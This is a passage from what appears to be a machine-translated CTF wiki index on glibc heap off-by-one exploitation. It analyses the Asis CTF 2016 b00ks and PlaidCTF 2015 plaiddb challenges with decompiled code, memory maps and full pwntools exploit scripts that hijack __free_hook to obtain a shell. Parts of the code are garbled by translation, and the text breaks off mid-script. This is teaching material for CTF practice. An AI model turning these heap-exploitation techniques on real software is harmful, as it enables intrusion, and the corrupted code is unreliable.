off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one. There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method.</p> <pre><code>DWORD 0x41424344\n\nMemory 0x44, 0x43, 0x42, 0x41\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#1-asis-ctf-2016-b00ks","title":"\u5b9e\u4f8b 1: Asis CTF 2016 b00ks","text":""},{"location":"pwn/linux/glibc-heap/off_by_one/#title-introduction","title":"Title introduction","text":"<p>The topic is a common menu-style program that features a library management system.</p> <pre><code>1. Create a book\n\n2. Delete a book\n\n3. Edit a book\n\n4. Print book detail\n\n5. Change current author name\n\n6. Exit\n</code></pre> <p>The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows.</p> <pre><code>Canary                        : No\n\nNX                            : Yes\n\nPIE                           : Yes\n\nFortify                       : No\n\nRelRO                         : Full\n</code></pre> <p>Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information.</p> <pre><code>struct book\n\n{\n\n    int id;\n\n    char *name;\n\n    char *description;\n\n    int size;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#create","title":"create","text":"<p>Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32.</p> <pre><code>printf(\"\\nEnter book name size: \", *(_QWORD *)&amp;size);\n\n__isoc99_scanf(\"%d\", &amp;size);\n\nprintf(\"Enter book name (Max 32 chars): \", &amp;size);\n\nptr = malloc(size);\n</code></pre> <p>The description is then assigned, the same size is customizable but unlimited.</p> <pre><code>printf(\"\\nEnter book description size: \", *(_QWORD *)&amp;size);\n\n        __isoc99_scanf(\"%d\", &amp;size);\n\n\n\nv5 = malloc(size);\n</code></pre> <p>After allocating the memory of the book structure</p> <pre><code>book = malloc(0x20uLL);\n\nif ( book )\n\n{\n\n    *((_DWORD *)book + 6) = size;\n\n    *((_QWORD *)off_202010 + v2) = book;\n\n    *((_QWORD *)book + 2) = description;\n\n    *((_QWORD *)book + 1) = name;\n\n    *(_DWORD *)book = ++unk_202024;\n\n    return 0LL;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#vulnerability","title":"Vulnerability","text":"<p>There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate.</p> <pre><code>signed __int64 __fastcall my_read(_BYTE *ptr, int number)\n\n{\n\n  int i; // [rsp+14h] [rbp-Ch]\n\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n\n\n  if ( number &lt;= 0 )\n\n    return 0LL;\n\nbuf = ptr;\n  for ( i = 0; ; ++i )\n\n  {\n\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n\n      return 1LL;\n\n    if ( *buf == '\\n' )\n\n      break;\n\n++ buf;\n    if ( i == number )\n\n      break;\n\n  }\n\n* buf = 0;\n  return 0LL;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#use","title":"Use","text":""},{"location":"pwn/linux/glibc-heap/off_by_one/#leak","title":"Leak","text":"<p>Because the my_read function in the program has a null byte off-by-one , in fact the terminator '\\x00' read by my_read is written to 0x555555756060. This will overwrite the terminator '\\x00' when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name.</p> <pre><code>0x555555756040: 0x6161616161616161  0x6161616161616161\n\n0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name\n\n0x555555756060: 0x0000555555757480 &lt;== pointer array    0x0000000000000000\n\n0x555555756070: 0x0000000000000000  0x0000000000000000\n\n0x555555756080: 0x0000000000000000  0x0000000000000000\n</code></pre> <p>In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer.</p> <pre><code>io.recvuntil('Enter author name:') # input author name\n\nio.sendline (&amp;#39;a&amp;#39; * 32)\n\nio.recvuntil (&amp;#39;&amp;gt;&amp;#39;) # create book1\nio.sendline ( &amp;#39;1&amp;#39;)\nio.recvuntil('Enter book name size:')\n\nio.sendline (&amp;#39;32 &amp;#39;)\nio.recvuntil('Enter book name (Max 32 chars):')\n\nio.sendline('object1')\n\nio.recvuntil('Enter book description size:')\n\nio.sendline (&amp;#39;32 &amp;#39;)\nio.recvuntil('Enter book description:')\n\nio.sendline('object1')\n\n\n\nio.recvuntil (&amp;#39;&amp;gt;&amp;#39;) # print book1\nio.sendline ( &amp;#39;4&amp;#39;)\nio.recvuntil ( &amp;#39;Author:&amp;#39;)\nio.recvuntil (&amp;#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#39;) # &amp;lt;== leak book1\nbook1_addr = io.recv (6)\nbook1_addr = book1_addr.ljust (8, &amp;#39;x00&amp;#39;)\nbook1_addr = u64(book1_addr)\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-override-pointer-low-byte","title":"off-by-one Override pointer low byte","text":"<p>The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array.</p> <p>After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled.</p> <pre><code>def off_by_one(addr):\n\n    addr += 58\n\n    io.recvuntil('&gt;')# create fake book in description\n\nio.sendline ( &amp;#39;3&amp;#39;)\n    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)\n\n    io.recvuntil('Enter new book description:')\n\n    io.sendline(fake_book_data) # &lt;== fake book\n\n\n\n\n\n    io.recvuntil('&gt;') # change author name\n\nio.sendline ( &amp;#39;5&amp;#39;)\n    io.recvuntil('Enter author name:')\n\n    io.sendline('a' * 32) # &lt;== off-by-one\n</code></pre> <p>Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff). Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily.</p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#using-the-stack-to-achieve-utilization","title":"Using the stack to achieve utilization","text":"<p>Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods.</p> <p>The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately.</p> <p>Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived. <pre><code>Start              End                Offset             Perm Path\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123\n0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw-\n\n0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- &lt;=== mmap\n\n0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw-\n\n0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]\n\n0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]\n\n0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]\n\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n</code></pre></p> <pre><code>Start              End                Offset             Perm Path\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123\n0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-\n\n0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- &lt;=== mmap\n\n0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n\n0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-\n\n0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]\n\n0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]\n\n0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]\n\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit","title":"exploit","text":"<pre><code>from pwn import *\n\ncontext.log_level=\"info\"\n\n\n\nbinary = ELF(\"b00ks\")\n\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\nio = process (&amp;quot;./ b00ks&amp;quot;)\n\n\n\n\ndef createbook(name_size, name, des_size, des):\n\nio.readuntil (&amp;quot;&amp;gt;&amp;quot;)\nio.sendline ( &amp;quot;1&amp;quot;)\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(str(name_size))\n\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(name)\n\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(str(des_size))\n\nio.readuntil (&amp;quot;:&amp;quot;)\nio.sendline (des)\n\n\ndef printbook(id):\n\nio.readuntil (&amp;quot;&amp;gt;&amp;quot;)\nio.sendline ( &amp;quot;4&amp;quot;)\nio.readuntil (&amp;quot;:&amp;quot;)\n    for i in range(id):\n\n        book_id = int(io.readline()[:-1])\nio.readuntil (&amp;quot;:&amp;quot;)\n        book_name = io.readline()[:-1]\n\nio.readuntil (&amp;quot;:&amp;quot;)\nbook_des = io.readline () [: - 1]\nio.readuntil (&amp;quot;:&amp;quot;)\n        book_author = io.readline()[:-1]\n\n    return book_id, book_name, book_des, book_author\n\n\n\ndef createname(name):\n\nio.readuntil (&amp;quot;name:&amp;quot;)\n    io.sendline(name)\n\n\n\ndef changename(name):\n\nio.readuntil (&amp;quot;&amp;gt;&amp;quot;)\nio.sendline ( &amp;quot;5&amp;quot;)\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(name)\n\n\n\ndef editbook(book_id, new_des):\n\nio.readuntil (&amp;quot;&amp;gt;&amp;quot;)\nio.sendline ( &amp;quot;3&amp;quot;)\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.writeline(str(book_id))\n\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(new_des)\n\n\n\ndef deletebook(book_id):\n\nio.readuntil (&amp;quot;&amp;gt;&amp;quot;)\nio.sendline ( &amp;quot;2&amp;quot;)\nio.readuntil (&amp;quot;:&amp;quot;)\n    io.sendline(str(book_id))\n\n\n\ncreatename(\"A\" * 32)\n\ncreatebook(128, \"a\", 32, \"a\")\n\ncreatebook(0x21000, \"a\", 0x21000, \"b\")\n\n\n\n\n\nbook_id_1, book_name, book_des, book_author = printbook(1)\n\nbook1_addr = u64(book_author[32:32+6].ljust(8,'\\x00'))\n\nlog.success(\"book1_address:\" + hex(book1_addr))\n\n\n\npayload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)\n\neditbook(book_id_1, payload)\n\nchangename(\"A\" * 32)\n\n\n\nbook_id_1, book_name, book_des, book_author = printbook(1)\n\nbook2_name_addr = u64(book_name.ljust(8,\"\\x00\"))\n\nbook2_des_addr = u64 (book_des.ljust (8, &amp;quot;x00&amp;quot;))\nlog.success(\"book2 name addr:\" + hex(book2_name_addr))\n\nlog.success(\"book2 des addr:\" + hex(book2_des_addr))\n\nlibc_base = book2_des_addr - 0x5b9010\n\nlog.success(\"libc base:\" + hex(libc_base))\n\n\n\nfree_hook = libc_base + libc.symbols[\"__free_hook\"]\n\none_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322\n\nlog.success(\"free_hook:\" + hex(free_hook))\n\nlog.success(\"one_gadget:\" + hex(one_gadget))\n\neditbook(1, p64(free_hook) * 2)\n\neditbook(2, p64(one_gadget))\n\n\n\ndeletebook(2)\n\n\n\nio.interactive ()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#simple-plan","title":"Simple plan","text":"<p>After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read.</p> <p>In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation.</p> <p>Exp is as follows:</p> <pre><code>#! /usr/bin/env python2\n\n# -*- coding: utf-8 -*-\n\n# vim: hay = utf-8\n\n\nimport sys\n\nimport\nimport os.path\n\nfrom pwn import *\n\ncontext(os='linux', arch='amd64', log_level='debug')\n\n\n\nif len(sys.argv) &gt; 2:\n\n    DEBUG = 0\n\n    HOST = sys.argv[1]\n\n    PORT = int(sys.argv[2])\n\n\n\n    p = remote(HOST, PORT)\n\nelse:\n\n    DEBUG = 1\n\n    if len(sys.argv) == 2:\n\n        PATH = sys.argv[1]\n\n\n\n    p = process(PATH)\n\n\n\ndef cmd(choice):\n\n    p.recvuntil('&gt; ')\n\n    p.sendline(str(choice))\n\n\n\n\n\ndef create(book_size, book_name, desc_size, desc):\n\n    cmd(1)\n\n    p.recvuntil(': ')\n\n    p.sendline(str(book_size))\n\n    p.recvuntil(': ')\n\n    if len(book_name) == book_size:\n\n        p.send(book_name)\n\n    else:\n\n        p.sendline(book_name)\n\n    p.recvuntil(': ')\n\n    p.sendline(str(desc_size))\n\n    p.recvuntil(': ')\n\n    if len(desc) == desc_size:\n\n        p.send(desc)\n\n    else:\n\n        p.sendline(desc)\n\n\n\n\n\ndef remove(idx):\n\n    cmd(2)\n\n    p.recvuntil(': ')\n\n    p.sendline(str(idx))\n\n\n\n\n\ndef edit(idx, desc):\n    cmd(3)\n\n    p.recvuntil(': ')\n\n    p.sendline(str(idx))\n\n    p.recvuntil(': ')\n\n    p.send(desc)\n\n\n\n\n\ndef author_name(author):\n\n    cmd(5)\n\n    p.recvuntil(': ')\n\n    p.send(author)\n\n\n\n\n\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n\n\ndef main():\n\n    # Your exploit script goes here\n\n\n\n    # leak heap address\n\n    p.recvuntil('name: ')\n\n    p.sendline('x' * (0x20 - 5) + 'leak:')\n\n\n\n    create(0x20, 'tmp a', 0x20, 'b') # 1\n\n    cmd(4)\n\n    p.recvuntil('Author: ')\n\n    p.recvuntil('leak:')\n\n    heap_leak = u64(p.recvline().strip().ljust(8, '\\x00'))\n\n    p.info('heap leak @ 0x%x' % heap_leak)\n\n    heap_base = heap_leak - 0x1080\n\n\n\n    create(0x20, 'buf 1', 0x20, 'desc buf') # 2\n\n    create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3\n\n    remove(2)\n\n    remove(3)\n\n\n\nptr = heap_base + 0x1180\npayload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &amp;#39;\\ x00&amp;#39;\n    create(0x20, 'name', 0x108, 'overflow') # 4\n\n    create(0x20, 'name', 0x100 - 0x10, 'target') # 5\n\n    create(0x20, '/bin/sh\\x00', 0x200, 'to arbitrary read write') # 6\n\n\n\n    edit(4, payload) # overflow\n\n    remove(5) # unlink\n\n\n\n    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\\n')\n\n\n\n    def write_to(addr, content, size):\n\n        edit(4, p64(addr) + p64(size + 0x100) + '\\n')\n\n        edit(6, content + '\\n')\n\n\n\n    def read_at(addr):\n\n        edit(4, p64(addr) + '\\n')\n\n        cmd(4)\n\n        p.recvuntil('Description: ')\n\n        p.recvuntil('Description: ')\n\n        p.recvuntil('Description: ')\n\n        content = p.recvline()[:-1]\n\n        p.info(content)\n\n        return content\n\n\n\n    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\\x00')) - 0x3c4b78\n\n    p.info('libc leak @ 0x%x' % libc_leak)\n\n\n\n    write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10)\n\n    remove(6)\n\n\n\n    p.interactive()\n\n\n\nif __name__ == '__main__':\n\n    main()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/off_by_one/#instance-2-plaidctf-2015-plaiddb","title":"Instance 2 : plaidctf 2015 plaiddb","text":"<pre><code>\u279c  2015_plaidctf_datastore git:(master) file datastore\n\ndatastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=1a031710225e93b0b5985477c73653846c352add, stripped\n\n\u279c  2015_plaidctf_datastore git:(master) checksec datastore\n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Full RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      PIE enabled\n\n    FORTIFY:  Enabled\n\n\u279c  2015_plaidctf_datastore git:(master)\n</code></pre> <p>As you can see, the program is 64-bit dynamically linked. The protection is all turned on.</p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#functional-analysis","title":"Functional Analysis","text":"<p>Key data structure:</p> <pre><code>struct Node {\n\nchar * key;\n    long data_size;\n\n    char *data;\n\n    struct Node *left;\n\n    struct Node *right;\n\n    long dummy;\n\n    long dummy1;\n\n}\n</code></pre> <p>The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization.</p> <p>The function function needs to pay attention to <code>getline</code> (self-implemented single-line read function):</p> <pre><code>char *__fastcall getline(__int64 a1, __int64 a2)\n\n{\n\n  char *v2; // r12\n\nchar * v3; // rbx\n  size_t v4; // r14\n\nchar v5; // al\nchar v6; // bp\n  signed __int64 v7; // r13\n\n  char *v8; // rax\n\n\n\nV2 = (char *)malloc(8uLL); // Initially use malloc(8) for allocation\nv3 = v2;\nV4 = malloc_usable_size(v2); // Calculated the available size, for example, for malloc(8), this should be 24\n  while ( 1 )\n\n  {\n\n    v5 = _IO_getc(stdin);\nv6 = v5;\n    if ( v5 == -1 )\n\n      bye();\n\n    if ( v5 == 10 )\n\n      break;\n\nv7 = v3 - v2;\n    if ( v4 &lt;= v3 - v2 )\n\n    {\n\nV8 = (char *)realloc(v2, 2 * v4); // The size is not enough to multiply the available size by two for realloc\n      v2 = v8;\n\n      if ( !v8 )\n\n      {\n\n        puts(\"FATAL: Out of memory\");\n\n        exit(-1);\n\n      }\n\nv3 = &amp;amp; v8 [v7];\n      v4 = malloc_usable_size(v8);\n\n    }\n\n*v3++ = v6; // &amp;lt;--- The vulnerability is where v3 is indexed and points to the next location. If the location is all used, it will point to the next non-writeable location.\n  }\n\n*v3 = 0; // &amp;lt;--- The vulnerability is located. Off by one (NULL byte overflow)\n  return v2;\n\n}\n</code></pre> <p>Several main features:</p> <pre><code>unsigned __int64 main_fn()\n\n{\n\n  char v1[8]; // [rsp+0h] [rbp-18h]\n\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n\n\n  v2 = __readfsqword(0x28u);\n\n  puts(\"PROMPT: Enter command:\");\n\n  gets_checked(v1, 8LL);\n\n  if ( !strcmp(v1, \"GET\\n\") )\n\n  {\n\n    cmd_get();\n\n  }\n\n  else if ( !strcmp(v1, \"PUT\\n\") )\n\n  {\n\n    cmd_put();\n\n  }\n\n  else if ( !strcmp(v1, \"DUMP\\n\") )\n\n  {\n\n    cmd_dump();\n\n  }\n\n  else if ( !strcmp(v1, \"DEL\\n\") )\n\n  {\n\n    cmd_del();\n\n  }\n\n  else\n\n  {\n\n    if ( !strcmp(v1, \"EXIT\\n\") )\n\n      bye();\n\n    __printf_chk(1LL, \"ERROR: '%s' is not a valid command.\\n\", v1);\n\n  }\n\n  return __readfsqword(0x28u) ^ v2;\n\n}\n</code></pre> <p>Both <code>dump</code> and <code>get</code> are used to read the content, so <code>key</code> and specific data content can be read, and less attention is needed. Focus on <code>put</code> and <code>del</code>:</p> <pre><code>__int64 __fastcall cmd_put()\n\n{\n\n__int64 v0; // rsi\n  Node *row; // rbx\n\n  unsigned __int64 sz; // rax\n\nchar * v3; // rax\n__int64 v4; // rbp\n  __int64 result; // rax\n\n  __int64 v6; // [rsp+0h] [rbp-38h]\n\n  unsigned __int64 v7; // [rsp+18h] [rbp-20h]\n\n\n\n  v7 = __readfsqword(0x28u);\n\n  row = (Node *)malloc(0x38uLL);\n\n  if ( !row )\n\n  {\n\n    puts(\"FATAL: Can't allocate a row\");\n\n    exit(-1);\n\n  }\n\n  puts(\"PROMPT: Enter row key:\");\n\n  row-&gt;key = getline((__int64)\"PROMPT: Enter row key:\", v0);\n\n  puts(\"PROMPT: Enter data size:\");\n\n  gets_checked((char *)&amp;v6, 16LL);\n\n  sz = strtoul((const char *)&amp;v6, 0LL, 0);\n\n  row-&gt;data_size = sz;\n\n  v3 = (char *)malloc(sz);\n\n  row-&gt;data = v3;\n\n  if ( v3 )\n\n  {\n\n    puts(\"PROMPT: Enter data:\");\n\n    fread_checked(row-&gt;data, row-&gt;data_size);\n\n    v4 = insert_node(row);\n\n    if ( v4 )\n\n    {\n\n      free(row-&gt;key);\n\n      free(*(void **)(v4 + 16));\n\n      *(_QWORD *)(v4 + 8) = row-&gt;data_size;\n\n      *(_QWORD *)(v4 + 16) = row-&gt;data;\n\n      free(row);\n\n      puts(\"INFO: Update successful.\");\n\n    }\n\n    else\n\n    {\n\n      puts(\"INFO: Insert successful.\");\n\n    }\n\n    result = __readfsqword(0x28u) ^ v7;\n\n  }\n\n  else\n\n  {\n\n    puts(\"ERROR: Can't store that much data.\");\n\n    free(row-&gt;key);\n\n    free(row);\n\n  }\n\n  return result;\n\n}\n</code></pre> <p>The distribution process is:</p> <p>Malloc (0x38) (structure) 2. getline (malloc \u548c realloc)</p> <ol> <li>malloc (size) controllable size</li> <li>Read the size byte content</li> </ol> <p>The more complicated part we can see later will be used, that is, the part about <code>free</code> used in put</p> <p>For deletion, this function is more complicated and will not be explained in detail. In fact, you only need to know that he is deleted according to the key, and the key is read using <code>getline</code>. If there is no such key, the part of <code>getline</code> will not be deleted. If any, then <code>free</code></p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit-analysis","title":"Exploit Analysis","text":"<p>The location of the vulnerability has been pointed out in the functional analysis, in <code>getline</code>, but the special feature of this function is that its allocated size is gradually increasing, by increasing the available size by two, using <code>realloc</code>, that is, if we want to trigger this vulnerability, we need to meet certain size requirements.</p> <p>According to the allocation process, the size of the satisfaction is:</p> <ul> <li> <p>0x18</p> </li> <li> <p>0x38</p> </li> <li> <p>0x78</p> </li> <li> <p>0xf8</p> </li> <li> <p>0x1f8</p> </li> <li> <p>...</p> </li> </ul> <p>These sizes can trigger an overflow.</p> <p>Now we need to know the specific methods we need to adopt. First, the <code>off-by-one</code> vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used.</p> <p>The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack.</p> <p>Here, we can begin to think about how to form the conditions of use we need. The final effect of <code>off-by-one</code> is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is:</p> <pre><code>+------------+\n\n| | &amp;lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done)\n+------------+\n\n| ... | &amp;lt;-- arbitrary chunk\n+------------+\n\n| | &amp;lt;-- Chunk for overflow\n+------------+\n\n| vuln | &amp;lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...)\n+------------+\n</code></pre> <p>After the use of <code>off-by-one</code>, the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap.</p> <p>According to our utilization ideas, combined with the topic <code>getline</code> function through <code>malloc(8)</code> and then <code>realloc</code>, we need to:</p> <ol> <li>At least one chunk of any chunk location has been allocated, and the chunk of data can be read to leak the libc address.</li> <li>The chunk that overflows needs to be allocated before the top chunk, otherwise <code>malloc(8)</code> will be allocated to the top instead of where the chunk should be.</li> <li>Any chunk location needs at least one chunk that has been released and has a size of 0x71 for fastbin attack</li> <li>All chunks should not be merged into top, so there should be an already allocated chunk at the bottom to guarantee the distance from the top chunk.</li> <li>The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of <code>getline</code>, <code>malloc(8)</code> cannot be allocated at this location.</li> </ol> <p>According to the above principles, we can think about the distribution of chunks as follows:</p> <pre><code>+------------+\n\n|      1     |  &lt;-- free \u7684 size == 0x200 chunk\n\n+------------+\n\n| 2 | &amp;lt;-- size == 0x60 fastbin chunk, has been allocated, and can read data\n+------------+\n\n| 5 | &amp;lt;-- size == 0x71 fastbin chunk, ready for fastbin attack\n+------------+\n\n|      3     |  &lt;-- size == 0x1f8 free \u72b6\u6001\u7684 smallbin/unsortedbin chunk\n\n+------------+\n\n| 4 | &amp;lt;-- size == 0x101 is overflowed chunk\n+------------+\n\n| X | &amp;lt;-- arbitrarily allocated chunks prevent top merge\n+------------+\n</code></pre> <p>Since the allocation process has some additional structure (the allocation of the structure itself and <code>getline</code>), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process.</p> <p>After that, release 5, 3, 1, and then use <code>delline</code> when <code>del</code> is input, fill 3, causing <code>off-by-one</code>, then merge 4 <code>free</code> to merge (forgery <code>prev_size</code>), so there is a cross heap structure.</p> <p>The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack.</p>"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit_1","title":"exploit","text":"<p>Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10.</p> <pre><code>#! /usr/bin/env python2\n# -*- coding: utf-8 -*-\n# vim:fenc=utf-8\n\nimport sys\nimport os\nimport os.path\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\n\nif len(sys.argv) &gt; 2:\n    DEBUG = 0\n    HOST = sys.argv[1]\n    PORT = int(sys.argv[2])\n\n    p = remote(HOST, PORT)\nelse:\n    DEBUG = 1\n    if len(sys.argv) == 2:\n        PATH = sys.argv[1]\n\n    p = process(PATH)\n\n\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # ubuntu 16.04\n\ndef cmd(command_num):\n    p.recvuntil('command:')\n    p.sendline(str(command_num))\n\n\ndef put(key, size, data):\n    cmd('PUT')\n    p.recvuntil('key:')\n    p.sendline(key)\n\n    p.recvuntil('size:')\n    p.sendline(str(size))\n    p.recvuntil('data:')\n    if len(data) &lt; size:\n        p.send(data.ljust(size, '\\x00'))\n    else:\n        p.send(data)\n\n\ndef delete(key):\n    cmd('DEL')\n    p.recvuntil('key:')\n    p.sendline(key)\n\n\ndef get(key):\n    cmd('GET')\n    p.recvuntil('key:')\n    p.sendline(key)\n    p.recvuntil('[')\n    num = int(p.recvuntil(' bytes').strip(' bytes'))\n    p.recvuntil(':\\n')\n    return p.recv(num)\n\n\ndef main():\n    # avoid complicity of structure malloc\n    for i in range(10):\n        put(str(i), 0x38, str(i))\n\n    for i in range(10):\n        delete(str(i))\n\n    # allocate what we want in order\n    put('1', 0x200, '1')\n    put('2', 0x50, '2')\n    put('5', 0x68, '6')\n    put('3', 0x1f8, '3')\n    put('4', 0xf0, '4')\n    put('defense', 0x400, 'defense-data')\n\n\n    # free those need to be freed\n    delete('5')\n    delete('3')\n    delete('1')\n\n    delete('a' * 0x1f0 + p64(0x4e0))\n\n    delete('4')\n\n    